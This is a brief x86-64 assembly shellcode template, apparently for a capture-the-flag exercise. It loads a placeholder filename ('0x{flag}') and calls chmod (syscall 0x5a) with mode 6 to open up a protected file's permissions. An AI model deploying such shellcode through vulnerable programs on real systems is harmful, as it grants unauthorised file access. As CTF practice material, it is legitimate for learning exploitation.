.intel_syntax noprefix
.global _start

.section .text
_start:
    push 0x{flag}
    push rsp
    pop rdi

    mov sil, 6

    push 0x5a
    pop rax
    syscall
